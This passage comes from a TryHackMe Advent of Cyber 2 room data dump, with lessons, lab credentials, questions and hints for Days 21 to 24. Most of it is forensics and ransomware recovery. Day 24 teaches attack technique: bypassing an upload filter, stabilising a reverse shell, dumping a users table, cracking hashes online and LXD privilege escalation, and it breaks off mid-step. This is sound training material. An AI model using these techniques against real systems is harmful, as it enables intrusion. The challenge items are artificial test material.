c:\\users\\administrator\\desktop\xa0</code>\xa0will change your location to the Administrator\'s desktop.</p><p>The last cmdlet that is needed to solve this room is\xa0<code style="font-size:14px">Select-String</code>. This cmdlet will search a particular file for a pattern you define within the command to run.</p><p>An example execution of this command is:\xa0<code style="font-size:14px">Select-String -Path \'c:\\users\\administrator\\desktop\' -Pattern \'*.pdf\'</code></p><p><span style="font-weight:bolder">Note</span>: You can always use the\xa0<code style="font-size:14px">Get-Help</code>\xa0cmdlet to obtain more information about a specific cmdlet. For example,\xa0<code style="font-size:14px">Get-Help Select-String</code></p>', 'taskType': 'vm', 'taskNo': 22, 'taskCreated': '2020-11-12T02:49:32.339Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fbffc6a9e6086762ec8aaef', 'questions': [{'questionNo': 1, 'question': '<p>Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?<br /></p>\n', 'hint': ''}, {'questionNo': 2, 'question': '<p>Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder? (This command will take a while)<br /></p>', 'hint': "Use -Filter '*3*'"}, {'questionNo': 4, 'question': '<p>How many words does the first file contain?<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>What 2 words are at index 551 and 6991 in the first file?<br /></p>', 'hint': ''}, {'questionNo': 6, 'question': '<p>This is only half the answer. Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want? (use spaces when submitting the answer)<br /></p>', 'hint': 'Use -Pattern "redryder"'}]}, {'taskTitle': '[Day 21] <span class="badge badge-soft-primary size-16">Blue Teaming</span> Time for some ELForensics', 'taskDesc': '<p>One of the \'little helpers\' logged into his workstation only to realize that the database connector file has been replaced, and he can\'t find the naughty list anymore. Furthermore, upon executing the database connector file, a taunting message was displayed, hinting that the file was moved to another location.</p><p>McEager has been notified, and he will put the pieces together to find the database connector file.</p><p>Watch DarkStar\'s Video On Solving The Task <a href="https://www.youtube.com/watch?v=tb3Bfy9nBhM" target="_blank">Here</a>.</p><p><span style="font-weight:bolder">Task</span>: Find where the database connector file is hidden using forensic-like investigative techniques.</p><hr style="border:1px solid var(--main-color)" /><p>You can use the\xa0<span style="font-weight:bolder">AttackBox</span>\xa0and\xa0<span style="font-weight:bolder">Remmina</span>\xa0to connect to the remote machine. Make sure the remote machine is deployed before proceeding.</p><p>Click on the plus icon as shown below.</p><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/remmina5.png" alt /></p><p>For\xa0<span style="font-weight:bolder">Server</span>\xa0provide (<code style="font-size:14px">MACHINE_IP</code>) as the IP address provided to you for the remote machine. The credentials for the user account is:</p><ul><li>User name:\xa0<code style="font-size:14px">littlehelper</code></li><li>User password:\xa0<code style="font-size:14px">iLove5now!</code></li></ul><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/remmina1b.png" alt /></p><p>Accept the Certificate when prompted and you should be logged into the remote system now.</p><p><span style="font-weight:bolder">Note</span>: The virtual machine may take up to 3 minutes to load.</p><hr style="border:1px solid var(--main-color)" /><p>We will continue our journey with Powershell. With Powershell, we can obtain file hashes of files on the endpoint.</p><p>A file hash, or simply a hash, is a mathematical algorithm that analyzes the data of the file and outputs a value, which is its hash.\xa0 File hashes let us know whether a file is legitimate or not based on its verified file hash. If the file has been replaced or altered, the file hash will be different. There are exceptions to this rule, but we will not dive into that. For now, it\'s safe to know that a file hash acts like a signature for a file.</p><p>With PowerShell, we can obtain the hash of a file by running the following command:\xa0<code style="font-size:14px">Get-FileHash -Algorithm MD5 file.txt</code></p><p>By comparing the verified file hash to the above cmdlet\'s output, you will know whether the file is authentic.</p><p>At this point, you should be confident that the file sitting in the Documents folder is not legitimate. If you run the file, you can see that not much information is given, only the hint that the original file was moved to another location within the endpoint.</p><p>Another tool you can use to inspect within a binary file (.exe) is\xa0<code style="font-size:14px">Strings.exe</code>. Strings scans the file you pass it for strings of a default length of 3 or more characters. You can use the Strings tool to peek inside this mysterious executable file. The tool is located within\xa0<code style="font-size:14px">C:\\Tools</code>.</p><p>The command to run for the Strings tool to scan the mysterious executable:\xa0<code style="font-size:14px">c:\\Tools\\strings64.exe -accepteula file.exe</code></p><p>In the output, you should notice a command related to ADS. You know this by the end of the Powershell command\xa0<code style="font-size:14px">-Stream</code>.</p><p><span style="font-weight:bolder">Alternate Data Streams</span>\xa0(ADS) is a file attribute specific to Windows\xa0<span style="font-weight:bolder">NTFS</span>\xa0(New Technology File System). Every file has at least one data stream ($DATA) and ADS allows files to contain more than one stream of data. Natively Window Explorer doesn\'t display ADS to the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files.</p><p>Malware writers have used ADS to hide data in an endpoint, but not all its uses are malicious. When you download a file from the Internet unto an endpoint there are identifiers written to ADS to identify that it was downloaded from the Internet.</p><p>The command to view ADS using Powershell:\xa0<code style="font-size:14px">Get-Item -Path file.exe -Stream *</code></p><p>There are a few lines of output when you run this command. Pay particularly close attention to\xa0<span style="font-weight:bolder">Stream</span>\xa0and\xa0<span style="font-weight:bolder">Length</span>.</p><p>Recall that the database connector file is an executable file, and it\'s hidden within an alternate data stream for another file. We can use a built-in Windows tool,\xa0<span style="font-weight:bolder">Windows Management Instrumentation</span>, to launch the hidden file.</p><p>The command to run to launch the hidden executable hiding within ADS:\xa0<code style="font-size:14px">wmic process call create $(Resolve-Path file.exe:streamname)</code></p><p><span style="font-weight:bolder">Note</span>: You must replace\xa0<span style="font-weight:bolder">file.exe</span>\xa0with the actual name of the file which contains the ADS, and\xa0<span style="font-weight:bolder">streamname</span>\xa0is the actual name of the stream displayed in the output.</p>\n', 'taskType': 'vm', 'taskNo': 23, 'taskCreated': '2020-11-12T02:49:48.521Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fbfe2ddbd13844e4a3ed006', 'questions': [{'questionNo': 1, 'question': '<p>Read the contents of the text file within the Documents folder. What is the file hash for db.exe?<br /></p>\n', 'hint': ''}, {'questionNo': 2, 'question': '<p>What is the file hash of the mysterious executable within the Documents folder?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Using Strings find the hidden flag within the executable?<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>What is the flag that is displayed when you run the database connector file?<br /></p>', 'hint': ''}]}, {'taskTitle': '[Day 22] <span class="badge badge-soft-primary size-16">Blue Teaming</span> Elf McEager becomes CyberElf', 'taskDesc': '<p>The past few days there have been strange things happening at Best Festival Company. McEager hasn\'t had the time to fully investigate the compromised endpoints with everything that is going on nor does he have the time to reimage the workstations. McEager decides to log into a different workstation, one of his backup systems.</p><p>McEager logs in and to his dismay he can\'t log into his password manager. It\'s not accepting his master key! He notices that the folder name has been renamed to something strange.</p><p><span style="font-weight:bolder">Task</span>: You must gain access to the password manager and decode the values within the password manager using CyberChef.</p><p><a href="https://www.youtube.com/watch?v=l0ZCyfA75ZE" target="_blank">Watch John Hammond solve this task!</a><br /></p><hr style="border:1px solid var(--main-color)" /><p>You can use the\xa0<span style="font-weight:bolder">AttackBox</span>\xa0and\xa0<span style="font-weight:bolder">Remmina</span>\xa0to connect to the remote machine. Make sure the remote machine is deployed before proceeding.</p><p>Click on the plus icon as shown below.</p><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/remmina5.png" alt /></p><p>For\xa0<span style="font-weight:bolder">Server</span>\xa0provide (<code style="font-size:14px">MACHINE_IP</code>) as the IP address provided to you for the remote machine. The credentials for the user account is:</p><ul><li>User name:\xa0<code style="font-size:14px">Administrator</code></li><li>User password:\xa0<code style="font-size:14px">sn0wF!akes!!!</code></li></ul><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/remmina6.png" alt /></p><p>Accept the Certificate when prompted and you should be logged into the remote system now.</p><p><span style="font-weight:bolder">Note</span>: The virtual machine may take up to 3 minutes to load.</p><hr style="border:1px solid var(--main-color)" /><p>Password managers are the norm these days. There are many cloud-based password managers but there also are password managers you run locally on your endpoint, such as KeePass. KeePass is an executable that allows you to store all types of data, including passwords, in a password-protected database. The official definition of KeePass from its website:</p><p>"<em>Today, you have to remember many passwords. You need a password for a lot of websites, your e-mail account, your webserver, network logins, etc. The list is endless. Also, you should use a different password for each account, because if you would use only one password everywhere and someone gets this password, you would have a problem: the thief would have access to all of your accounts. KeePass is a free open source password manager, which helps you to manage your passwords in a secure way. You can store all your passwords in one database, which is locked with a master key. So you only have to remember one single master key to unlock the whole database.</em>"</p><p>Now with that out of the way, open the strange-looking folder name on the desktop and run KeePass. You will be prompted to enter the master password. If you enter the phrase\xa0<span style="font-weight:bolder">mceagerrockstar</span>\xa0you will see a message stating that the key is invalid.</p><p>Looking back at the folder name it looks cryptic, like some sort of encoding. Encryption and encoding are familiar techniques used in IT, especially within Computer Security. Malware writers use some of these encoding techniques to hide their malicious code. Some encodings are quickly identifiable and some are not.</p><p>You can use\xa0<span style="font-weight:bolder">CyberChef</span>\xa0to decrypt/decode the encrypted/encoded values that you will encounter within this endpoint. CyberChef is the self-purported \'Cyber Swiss-Army Knife\' created by GCHQ. It\'s a fantastic tool for data transformation, extraction &amp; manipulation in your web-browser. CyberChef uses recipes to perform this magic.</p><p>Speaking of \'magic\', you can use the\xa0<code style="font-size:14px">Magic</code>\xa0recipe to decode the folder name. There is a local copy of CyberChef (<code style="font-size:14px">C:\\Tools</code>) on the endpoint.</p><p>To use a recipe simply drag and drop it into the\xa0<span style="font-weight:bolder">Recipe</span>\xa0window.\xa0<code style="font-size:14px">Auto Bake</code>\xa0should be checked of which will automatically run the recipe against the encoded value. If it is not checked, simply press\xa0<code style="font-size:14px">BAKE!</code></p><p>Now that you have unlocked KeePass, you should see that there are more encodings within the KeePass database file. Take a close look at the\xa0<span style="font-weight:bolder">Notes</span>\xa0for each entry. They will provide clues on how to decode them. Some of the popular encodings are listed under\xa0<span style="font-weight:bolder">Favourites</span>. (HINT)</p><p>Note: To view the\xa0<span style="font-weight:bolder">Password</span>\xa0entries, click on the\xa0<code style="font-size:14px">ellipsis</code>\xa0[<em>...</em>].</p><p>Malware writers perform various iterations of encoding to frustrate the reverse engineering process. With that being said, one of the encoded values will require you to run the duplicate recipe 2x to get the fully decoded value. (HINT)</p>\n', 'taskType': 'vm', 'taskNo': 24, 'taskCreated': '2020-11-12T02:50:02.469Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fc42ad6795fb5171fa93d6f', 'questions': [{'questionNo': 1, 'question': '<p>What is the password to the KeePass database?<br /></p>\n', 'hint': "Look under 'Result snippet'."}, {'questionNo': 2, 'question': "<p>What is the encoding method listed as the 'Matching ops'?<br /></p>", 'hint': "Look under 'Properties'."}, {'questionNo': 3, 'question': '<p>What is the decoded password value of the Elf Server?<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>What is the decoded password value for ElfMail?<br /></p>', 'hint': "The clue is 'Entities'. Look under 'Data format'."}, {'questionNo': 5, 'question': '<p>Decode the last encoded value. What is the flag?<br /></p>', 'hint': "Add 'From Charcode' recipe twice. Comma as the delimiter and base of 10."}]}, {'taskTitle': '[Day 23] <span class="badge badge-soft-primary size-16">Blue Teaming</span> The Grinch strikes again!', 'taskDesc': '<p>The mayhem at Best Festival Company continues. McEager receives numerous emails and phone calls about a possible ransomware attack affecting all the endpoints in the network. McEager knows that the endpoints which are infected with the malware don\'t have any backup copies but luckily on his workstation he has backups enabled.</p><p><span style="font-weight:bolder">Task</span>: Investigate the malware and restore the files to their original state.</p><p><a href="https://www.youtube.com/watch?v=rY1qsQIOl8I" target="_blank">Watch DarkStars video on solving this task!</a><br /></p><hr style="border:1px solid var(--main-color)" /><p>You can use the\xa0<span style="font-weight:bolder">AttackBox</span>\xa0and\xa0<span style="font-weight:bolder">Remmina</span>\xa0to connect to the remote machine via RDP (Remote Desktop Protocol).</p><p>To get the full experience of the simulated ransomware attack there are some settings you need to configure on Remmina to view the wallpaper on the remote machine.</p><p>Launch Remmina. When the application loads, click the ellipsis to access the Preferences options.</p><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/remmina1.png" alt /></p><p>At the dropdown, click Preferences.</p><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/remmina2.png" alt /></p><p>Click on the RDP in the Preferences window.</p><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/remmina3.png" alt /></p><p>Make the following changes and click OK.</p><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/remmina4.png" alt /></p><p>Now with that set, you are ready to connect to the remote machine. Make sure it\'s deployed before proceeding. Click on the plus icon as shown below.</p><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/remmina5.png" alt /></p><p>For\xa0<span style="font-weight:bolder">Server</span>\xa0provide (<code style="font-size:14px">MACHINE_IP</code>) as the IP address provided to you for the remote machine. The credentials for the user account is:</p><ul><li>User name:\xa0<code style="font-size:14px">administrator</code></li><li>User password:\xa0<code style="font-size:14px">sn0wF!akes!!!</code></li></ul><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/remmina6.png" alt /></p><p>Accept the Certificate when prompted and you should be logged into the remote system now.</p><p><span style="font-weight:bolder">Note</span>: The virtual machine may take up to 3 minutes to load.</p><hr style="border:1px solid var(--main-color)" /><p>Ransomware is a real threat that enterprise defenders and casual computer users need to defend &amp; prepare against. According to Wikipedia, ransomware is a type of malware that threatens to publish the victim\'s data or perpetually block access to it unless a ransom is paid. It can be a frightening experience to log into a machine only to realize that malware has encrypted all of your important documents.</p><p>There are numerous security products that can be implemented in the security stack to catch this type of malware. If ransomware infects an endpoint, depending on the actual malware, there might be a decryptor made available by a security vendor. If not then you must rely on backups in order to restore your machines to the last working state, along with its files. Windows has a built-in feature that can assist with that.</p><p>The\xa0<span style="font-weight:bolder">Volume Shadow Copy Service</span>\xa0(VSS) coordinates the actions that are required to create a consistent shadow copy (also known as a snapshot or a point-in-time copy) of the data that is to be backed up.\xa0 (<span style="font-weight:bolder">official definition</span>)</p><p>Malware writers know of this Windows feature and write code in their malware to look for these files and delete them. Doing so makes it impossible to recover from a ransomware attack unless you have an offline/off-site backup. Not all malware deletes the volume shadow copies though.</p><p>Before diving into VSS on the endpoint let\'s talk briefly regarding the Task Scheduler.</p><p>The\xa0<span style="font-weight:bolder">Task Scheduler</span>\xa0enables you to automatically perform routine tasks on a chosen computer. Task Scheduler does this by monitoring whatever criteria you choose (referred to as triggers) and then executing the tasks when those criteria are met. (<span style="font-weight:bolder">official definition</span>)</p><p>Malware writers might have the malware create a scheduled task in order for the malware to run at a specific desired day/time or trigger. The Task Scheduler utility has been conveniently been placed in the taskbar for you. To view, the scheduled tasks click on\xa0<span style="font-weight:bolder">Task Scheduler Library</span>.\xa0 You should see 2 scheduled tasks of interest: 1 with a weird name and the other related to VSS. Click on any of the scheduled tasks to populate more information about it, such as\xa0<span style="font-weight:bolder">Triggers</span>\xa0and\xa0<span style="font-weight:bolder">Actions</span>.</p><p>At this point you should realize that VSS is enabled and thanks to the scheduled task you know the ID of the volume.</p><p>The command to interact with VSS is\xa0<code style="font-size:14px">vssadmin</code>. Running the command alone will display brief information on how to run the utility with additional commands. Two commands of particular interest are\xa0<code style="font-size:14px">List Volumes</code>\xa0and\xa0<code style="font-size:14px">List Shadows</code>.</p><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/vssadmin1.png" alt /></p><p>If you run\xa0<code style="font-size:14px">vssadmin list volumes</code>\xa0you will see that the C:\\ drive has a different volume name/id. There must be another volume on the endpoint.</p><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/vssadmin2.png" alt /></p><p>You can use Disk Management to check into that.\xa0<span style="font-weight:bolder">Disk Management</span>\xa0is a system utility in Windows that enables you to perform advanced storage tasks. (<span style="font-weight:bolder">official definition</span>) As with the other utilities, Disk Management has been placed in the taskbar for your convenience.</p><p>As you can see there is another volume but you\'re unable to view it within Windows Explorer. Right-click the partition to view its properties. Now, look at the\xa0<code style="font-size:14px">Security</code>\xa0tab. Confirm that the volume name/id from the Task Scheduler and vssadmin output is similar to the\xa0<code style="font-size:14px">object name</code>\xa0of this partition.\xa0 Also, notice there is a tab titled\xa0<code style="font-size:14px">Shadow Copies</code>. Review the information and close the Properties window.</p><p>In order to see this partition within Windows Explorer, you must assign it a drive letter. Right-click the partition and select\xa0<code style="font-size:14px">Change Drive Letter and Paths</code>.\xa0 Click\xa0<code style="font-size:14px">Add</code>.\xa0 In the dropdown choose a letter, such as Z, and click OK.\xa0 At the top, in the Volume column, you should now see that the partition has a letter assigned to it. Open Windows Explorer to navigate to the partition.</p><p>In a previous challenge, you managed to view hidden content in folders via the command-line. You can do the same within Windows Explorer. In the menu, select\xa0<code style="font-size:14px">View</code>, and checkmark\xa0\xa0<code style="font-size:14px">Hidden Items</code>. You should now see any hidden content right within Windows Explorer.</p><p>Back to VSS, to restore files to a previous version, simply right-click the folder and select\xa0<code style="font-size:14px">Properties</code>\xa0then select the\xa0<code style="font-size:14px">Previous Versions</code>\xa0tab.\xa0 Select which shadow copy you would like to restore and click the\xa0<code style="font-size:14px">Restore</code>button. Accept the confirmation to restore the shadow copy. Close the Properties window and drill into the folder to find the restore file(s).</p>\n', 'taskType': 'vm', 'taskNo': 25, 'taskCreated': '2020-11-12T02:50:08.604Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fbfd0613e0a047b6372fa6c', 'questions': [{'questionNo': 1, 'question': "<p>Decrypt the fake 'bitcoin address' within the ransom note. What is the plain text value?<br /></p>\n", 'hint': ''}, {'questionNo': 2, 'question': '<p>At times ransomware changes the file extensions of the encrypted files. What is the file extension for each of the encrypted files?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>What is the name of the suspicious scheduled task?<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>Inspect the properties of the scheduled task. What is the location of the executable that is run at login?<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>There is another scheduled task that is related to VSS. What is the ShadowCopyVolume ID?<br /></p>', 'hint': ''}, {'questionNo': 6, 'question': '<p>Assign the hidden partition a letter. What is the name of the hidden folder?<br /></p>', 'hint': ''}, {'questionNo': 7, 'question': "<p>Right-click and inspect the properties for the hidden folder. Use the 'Previous Versions' tab to restore the encrypted file that is within this hidden folder to the previous version. What is the password within the file?<br /></p>", 'hint': ''}]}, {'taskTitle': '[Day 24]  <span class="badge badge-soft-info size-16">Final Challenge</span> The Trial Before Christmas', 'taskDesc': '<p style="text-align:center"><span style="font-size:18px">\ufeff</span><img src="https://i.imgur.com/NamdCiA.png" style="width:50%" /><i><br /></i></p><p><i><br /></i></p><p><i>It was the night before Christmas and The Best Festival Company could finally rest. All of the toys had been made and the company had recovered from attack after attack. Everything was in Santa\'s hands now, leaving the elves to do little more than wish him a safe journey ahead. Elf McEager sat at his terminal staring absentmindedly at light snow that had begun to fall. Just as he had drifted off to sleep Elf McEager was jolted to attention as a small parcel appeared just at the edge of his view.\xa0</i></p><p><i>The present was wrapped in a deep blue velvet that appeared to shimmer in and out of the firelight, not unlike a blinking terminal prompt. Carefully, Elf McEager reached for the azure ribbon, untying it slowly so as to not damage it. The velvet slowly fell away, revealing a small NUC computer with a letter on top. Unfolding the letter, Elf McEager read it aloud:</i></p><p><i><br /></i></p><p style="text-align:center"><i>"Elf McEager - your boundless effort to save Christmas this year has not gone unnoticed. I wanted to reward you with a special present, however, there\'s a catch. Elf McSkidy and I have seen your skills advance and we feel it would only be appropriate to give you a present after one last challenge. Inside this package, you\'ll have also found a computer. Plug this into the network and hack into it. Best of luck and Merry Christmas - Santa"</i></p><p style="text-align:center"><br /></p><p style="text-align:left"><i>Without delay, Elf McEager connected the NUC appropriately and watched it whir to life. A small screen nearby the power button blinked and then displayed the IP address assigned to the device. Next to the IP, a small symbol appeared. McEager quietly wondered to himself what it could mean as he logged into his terminal, ready to start his final challenge.\xa0</i></p><p><i><br /></i></p><p style="text-align:center"><img src="https://i.imgur.com/q06tn5B.png" style="width:25%" /><i><br /></i></p><p style="text-align:center"><i><br /></i></p><p><i><span style="font-size:18px">Wanting to follow along without it feeling so challenging? </span><a href="https://www.youtube.com/watch?v=y0mfhyfZyKY" target="_blank">Watch one of the creators, Darkstar\'s video</a><span style="font-size:18px"> on solving today\'s challenge.\xa0</span></i></p><hr style="border:1px solid var(--main-color)" /><p><i><u><span style="font-size:18px"><br /></span></u></i></p><p><span style="font-size:18px"><i>Today\'s task is an accumulation of the skills you\'ve gained throughout the Advent of Cyber 2. A dossier has been provided on various topics below as well which will aid in your journey. Don\'t be afraid to ask for help in the </i></span><code>advent-of-cyber-2</code><span style="font-size:18px"><i> <a href="https://discord.gg/tryhackme" target="_blank">Discord </a>channel where necessary, just be sure to try your best!\xa0</i></span></p><p><span style="font-size:18px"><br /></span></p><p><i><u><span style="font-size:18px">Client-Side Filters</span></u><span style="font-size:18px">:</span></i></p><p>Way back in Day 2 we looked at how to bypass a server-side filter around a file-upload function. It\'s now time to see how to bypass a <em>client</em>-side filter.</p><span style="font-size:18px">\n</span><p>In many ways, client-side filters are easier to bypass than their server-side equivalents as they execute on your own attacking computer -- putting them under the control of an attacker. For this reason, client-side filters should never be used as the sole security measure for the file upload functionality on a website.</p><span style="font-size:18px">\n</span><p>So, how would we bypass a client-side filter? The easiest way is by using BurpSuite to intercept the JavaScript code file containing the filter before it ever actually reaches our browser, then either drop the file entirely or remove the filter from the code.</p><span style="font-size:18px">\n</span><p>Opening a new BurpSuite project, the first thing we have to do is navigate to the "Proxy" tab, then the "Options" subsection:</p><span style="font-size:18px">\n</span><p><img src="https://i.imgur.com/51Id8P4.png" alt /></p><span style="font-size:18px">\n</span><p>By default BurpSuite does not intercept JavaScript files when proxying traffic, so we need to enable this feature before we can start deleting any client-side filters. To do this, we navigate to the "Intercept Client Requests" section, click on the top line (highlighted below), then click edit:</p><span style="font-size:18px">\n</span><p><img src="https://i.imgur.com/baX7Cwk.png" alt /></p><span style="font-size:18px">\n</span><p>This will give us the option to edit the condition. Find and remove the <code>|^js$</code> in the condition, then save the filter:</p><span style="font-size:18px">\n</span><p><img src="https://i.imgur.com/BbIJjlC.png" alt width="598" height="267" /></p><span style="font-size:18px">\n</span><p>Next, go to the "Intercept Server Responses" section and select the "Intercept responses based on the following rules" checkbox:</p><span style="font-size:18px">\n</span><p><img src="https://i.imgur.com/oiypPu7.png" alt /></p><span style="font-size:18px">\n</span><p>This will now intercept all responses from the server, including the JavaScript files!</p><span style="font-size:18px">\n</span><p>Now you can reload the upload page by pressing <strong>Ctrl + F5 </strong>(Note that this <em>must</em> be done with a hard refresh to prevent <code>304 Not Modified</code> responses), proxying through BurpSuite. Keep an eye on the responses as they come back -- <b>if one is called</b> <code>filter.js</code>, <b>it would probably be a good idea to drop it!</b></p><p><span style="font-size:18px">If you use Mac, the equivalent sequence for a hard refresh is Preferences -&gt; Clear History, then Control + R.<br /></span></p><p><span style="font-size:18px">For more information on this topic, see the <a href="https://tryhackme.com/room/uploadvulns" target="_blank">Upload Vulnerabilities</a> room!</span></p><p><span style="font-size:18px"><br /></span></p><p><span style="font-size:18px"><br /></span><i><span style="font-size:18px"></span></i></p><p><i><span style="font-size:18px"><u>Shell Upgrading and Stabilization</u>:</span></i><br /></p><p>You will be familiar with reverse shells from previous tasks or rooms; however, the shells you have been taught so far have had several fatal flaws. For example, pressing <code>Ctrl + C</code> killed the shell entirely. You could not use the arrow keys to see your shell history, and TAB autocompletes didn’t work. Stabilizing shells is an important skill to learn as it fixes all of these problems, providing a much nicer working environment.</p><span style="font-size:18px">\n</span><p>Working inside the reverse shell:</p><span style="font-size:18px">\n</span><ol>\n<li class="has-line-data">The first thing to do is use <code>python3 -c \'import pty;pty.spawn("/bin/bash")\'</code>, which uses Python to spawn a better-featured bash shell. At this point, our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.</li>\n<li class="has-line-data">Step two is: <code>export TERM=xterm</code> – this will give us access to term commands such as <code>clear</code>.</li>\n<li class="has-line-data">Finally (and most importantly) we will background the shell using <code>Ctrl + Z</code>. Back in our own terminal we use <code>stty raw -echo; fg</code>. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and <code>Ctrl + C</code> to kill processes). It then foregrounds the shell, thus completing the process.</li>\n</ol><span style="font-size:18px">\n</span><p>The full technique can be seen here:<br />\n<img src="https://i.imgur.com/bQnFz1T.png" alt /></p><p><br />\nNote that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type <code>reset</code> and press enter.</p><p>See the <a href="https://tryhackme.com/room/introtoshells" target="_blank">Intro to Shells</a> room for more information on this topic!<br /></p><p><i><span style="font-size:18px"><br /></span></i></p><p><i><span style="font-size:18px"><br /></span></i></p><p><i><u><span style="font-size:18px">Your New Best Friend - The MySQL Client</span></u><span style="font-size:18px">:</span></i><i><span style="font-size:18px"><br /></span></i></p><p>Databases are used by virtually every web application on the planet to some extent or another. For this reason it’s important that we know how to access them manually. One of the most common database servers available is MySQL (or its free fork: MariaDB, which uses identical syntax and is accessed in exactly the same way). This can be accessed manually using the <code>mysql</code> client. There’s a catch though – exposing a database publicly is a very bad idea, so, whilst it <em>is</em> possible to connect to a database remotely from your attacking machine using the MySQL client, we will be focussing on connecting to a database running locally.</p><span style="font-size:18px">\n</span><p>To access a database using the MySQL client, we would use the following syntax:<br />\n<code>mysql -uUSERNAME -p</code><br />\nThis tells the client to connect to the local database using a username of <code>USERNAME</code> (<strong>Note the lack of space between the switch <code>-u</code> and the value!</strong>), using a password which it will ask us to enter when we run the command.</p><span style="font-size:18px">\n</span><p>Having entered the password, we will be confronted with a prompt which looks something like this:<br />\n<img src="https://i.imgur.com/yv77Mp4.png" alt /><br />\nNote that this will look slightly different depending on whether it’s a MySQL server or a MariaDB server.</p><span style="font-size:18px">\n</span><p>The next thing we should do is use the <code>show databases;</code> command to see the databases available:<br />\n<img src="https://i.imgur.com/WU7pBvi.png" alt /><br />\nIn this screenshot, the top three databases are default for a MySQL/MariaDB installation. Any others are not.</p><span style="font-size:18px">\n</span><p>Let’s take a look at the <code>top_secret</code> database.<br />\nTo enter the database we use the <code>use DATABASE;</code> command, where <code>DATABASE</code> is the name of the target DB. We can then show all the tables in the database with <code>show tables;</code>:<br />\n<img src="https://i.imgur.com/lEI7cFO.png" alt /><br />\nIn this screenshot there is only one table: <code>users</code>.</p><span style="font-size:18px">\n</span><p><span style="font-size:18px">Let’s dump the </span><code>users</code><span style="font-size:18px"> table. To do this we use the SQL command: </span><code>SELECT * FROM users;</code><span style="font-size:18px">.</span><br /><span style="font-size:18px">\n</span><img src="https://i.imgur.com/cZJO2Dh.png" alt /><br /><span style="font-size:18px">\nWe now have a username and a password we can look at cracking!</span></p><p><i><span style="font-size:18px"><br /></span></i></p><p><i><span style="font-size:18px"><br /></span></i></p><p><i><span style="font-size:18px"><u>Online Password Cracking</u>:</span></i><i><span style="font-size:18px"><br /></span></i></p><p><span style="font-size:1rem">In the modern age of password cracking, weak passwords can often be cracked without any cracking at all! Many websites now exist with the sole goal of hosting rainbow tables - tables of previously cracked passwords. This allows us more than often to simply input a password hash and nearly instantly receive the cracked password. Some various sites that I find myself (Dark) commonly using, especially throughout the case of CTFs, include the following:</span><br /></p><p>-\xa0<a href="https://crackstation.net/" target="_blank">https://crackstation.net/</a>\xa0</p><p>-\xa0<a href="https://md5decrypt.net/en/" target="_blank">https://md5decrypt.net/en/</a>\xa0</p><p>-\xa0<a href="https://hashes.com/en/decrypt/hash" target="_blank">https://hashes.com/en/decrypt/hash</a>\xa0</p><p><br /></p><p style="text-align:center"><img src="https://i.imgur.com/3HQL26A.png" style="width:50%" /></p><p style="text-align:center"><i>The landing page of crackstation.net</i></p><p><i><span style="font-size:18px"><br /></span></i></p><p><i><span style="font-size:18px"><br /></span></i></p><p><i><u><span style="font-size:18px">Privilege Escalation with LXD</span></u><span style="font-size:18px">:</span></i><i><span style="font-size:18px"><br /></span></i></p><p>Among the more curious privilege escalation methods on Linux, lxd is certainly a mind-bender, to say the least. This technique involves leveraging a flaw in lxd, a program that we can use to spin up containers much akin to Docker. This exploit specifically involves abusing mount points to mount volumes from our victim machine (the machine we\'re attacking) within a container that we shouldn\'t be able to access/read. However, we have root powers on lxd containers - thus allowing us to bypass the read permission checks and escalate our privileges. We can perform this privesc method via the following steps:</p><p>1. First, we need to check and see if our user is a member of the lxd group. We can do this with the command: id</p><p><br /></p><p style="text-align:center"><img src="https://i.imgur.com/wmztMtK.png" style="width:809px" /><br /></p><p></p><p style="text-align:center"><i>We can see in this case that the user is a member of the lxd group. Note, images from this section are from the source linked at the end with regards to additional information.\xa0</i></p><p style="text-align:center"><i><br /></i></p><p>2. Typically, this privesc can be a bit of a drawn-out process, however, in our case, we\'ll be able to skip part of the way through. To perform it properly, we have to perform the following steps.:</p><p>- Steps to be performed on the attacking machine:</p><p>- - Download build-alpine on your local machine via the\xa0<a href="https://github.com/lxd-images/alpine-3-7-apache-php5-6" target="_blank">git repository</a></p><p>- - Execute the script "build -alpine" that will build the latest Alpine image as a compressed file. This must be executed by the root user.</p><p>- - Transfer this newly created tar file to the victim machine</p><p><br /></p><p>- Steps to be performed on the victim machine:</p><p>- - Download the alpine image</p><p>- - Import image for lxd</p><p>- - Initialize the image inside a new container\xa0<span style="font-weight:bolder">&lt;- Worth checking the already imported/available images as you may be able to skip to this step</span></p><p>- - Mount the container inside the /root directory</p><p><br /></p><p>3. For the sake of this example, we\'ll be skipping close to the end (see the bolded bit above) by checking what images are readily available on the machine in question. We can do that via the following command: lxc image list</p><p><br /></p><p><img 